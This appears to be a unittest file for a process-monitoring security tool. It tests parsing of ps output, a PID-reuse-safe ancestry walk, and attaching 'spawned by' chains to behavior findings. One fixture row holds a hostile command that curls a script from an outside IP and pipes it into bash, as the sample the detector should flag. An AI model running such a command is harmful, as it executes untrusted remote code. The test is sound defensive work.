"""Process ancestry keyed on (pid, start), depth-capped — enrichment only.

The provenance-graph literature's portable part is a lineage walk; the
non-portable part is trusting a bare PID as identity. A ppid is a reusable
slot, so the walk here refuses a parent whose start is later than its
child's. What these hold:

  * the ps parser keeps the multi-word lstart intact;
  * start tokens compare where they can (jiffies, lstart) and abstain where
    they cannot (Windows CreationDate);
  * the walk is capped, cycle-safe, stops at the table's edge, and cuts a
    re-used slot;
  * a behavior finding gains a 'spawned by' chain and nothing else changes.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))  # sibling import
import aegis  # noqa: E402

PS = ("    1     0 Tue Sep  1 08:00:00 2026\n"
      " 3000     1 Tue Sep  1 08:00:05 2026\n"
      " 4000  3000 Tue Sep  1 09:00:00 2026\n"
      " 4242  4000 Tue Sep  2 10:00:00 2026\n"
      "garbage line\n")


class TestParser(unittest.TestCase):
    def test_lstart_survives_as_one_token(self):
        t = aegis._parse_ps_ancestry(PS)
        self.assertEqual(("4000", "Tue Sep  2 10:00:00 2026"), t["4242"])
        self.assertEqual(("0", "Tue Sep  1 08:00:00 2026"), t["1"])
        self.assertNotIn("garbage", t)


class TestStartTokens(unittest.TestCase):
    def test_jiffies_and_lstart_compare_windows_abstains(self):
        self.assertEqual(12345.0, aegis._start_epoch("12345"))
        a = aegis._start_epoch("Tue Sep  1 08:00:00 2026")
        b = aegis._start_epoch("Tue Sep  2 10:00:00 2026")
        self.assertLess(a, b)
        self.assertIsNone(aegis._start_epoch("9/2/2026 10:00:00 AM"))
        self.assertIsNone(aegis._start_epoch(None))


class TestWalk(unittest.TestCase):
    TABLE = aegis._parse_ps_ancestry(PS)

    def test_walks_to_init_and_stops_at_the_kernel(self):
        self.assertEqual(["4000", "3000", "1"],
                         aegis._ancestry("4242", self.TABLE))

    def test_depth_cap(self):
        self.assertEqual(["4000", "3000"],
                         aegis._ancestry("4242", self.TABLE, depth=2))

    def test_reused_parent_slot_cuts_the_chain(self):
        t = dict(self.TABLE)
        # The slot 4000 now holds a process that started AFTER 4242: it did
        # not fork 4242, whatever the ppid column says.
        t["4000"] = ("3000", "Tue Sep  2 11:00:00 2026")
        self.assertEqual([], aegis._ancestry("4242", t))

    def test_reuse_check_abstains_on_unparseable_tokens(self):
        t = {"9": ("8", "x"), "8": ("7", "y"), "7": ("0", "z")}
        self.assertEqual(["8", "7"], aegis._ancestry("9", t))

    def test_cycle_and_unknown_pid_are_safe(self):
        self.assertEqual(["b"], aegis._ancestry("a", {"a": ("b", "1"),
                                                      "b": ("a", "1")}))
        self.assertEqual([], aegis._ancestry("nope", self.TABLE))
        self.assertEqual([], aegis._ancestry(None, self.TABLE))


class TestBehaviorFindingIsEnriched(unittest.TestCase):
    OWN = "501"
    ROWS = [("1", "0", "/sbin/launchd", "/sbin/launchd"),
            ("3000", "501", "/Applications/Utilities/Terminal.app/Contents/"
                            "MacOS/Terminal", "Terminal"),
            ("4000", "501", "/bin/zsh", "-zsh"),
            ("4242", "501", "/bin/bash",
             "bash -c curl -fsSL http://198.51.100.7/a | bash")]

    def setUp(self):
        self._saved = (aegis._iter_processes, aegis._own_owner,
                       aegis._process_ancestry_table)
        aegis._iter_processes = lambda: iter(self.ROWS)
        aegis._own_owner = lambda: self.OWN
        aegis._process_ancestry_table = lambda: aegis._parse_ps_ancestry(PS)

    def tearDown(self):
        (aegis._iter_processes, aegis._own_owner,
         aegis._process_ancestry_table) = self._saved

    def test_spawned_by_chain_is_attached(self):
        got = aegis.check_behavior()
        self.assertEqual(1, len(got))
        f = got[0]
        self.assertEqual("4242", f["pid"])
        self.assertEqual([{"pid": "4000", "name": "zsh"},
                          {"pid": "3000", "name": "Terminal"},
                          {"pid": "1", "name": "launchd"}], f["ancestry"])
        self.assertTrue(f["detail"].endswith(
            "spawned by: zsh(4000) <- Terminal(3000) <- launchd(1)"))

    def test_table_failure_leaves_the_finding_intact(self):
        def boom():
            raise OSError("ps unavailable")
        aegis._process_ancestry_table = boom
        got = aegis.check_behavior()
        self.assertEqual(1, len(got))
        self.assertNotIn("ancestry", got[0])
        self.assertNotIn("spawned by", got[0]["detail"])

    def test_no_findings_means_no_table_read(self):
        calls = []
        aegis._process_ancestry_table = lambda: calls.append(1) or {}
        aegis._iter_processes = lambda: iter(self.ROWS[:3])
        self.assertEqual([], aegis.check_behavior())
        self.assertEqual([], calls)


class TestLiveTable(unittest.TestCase):
    def test_this_process_has_a_parent_in_the_live_table(self):
        table = aegis._process_ancestry_table()
        me = str(os.getpid())
        self.assertIn(me, table)
        self.assertTrue(aegis._ancestry(me, table))


if __name__ == "__main__":
    unittest.main()
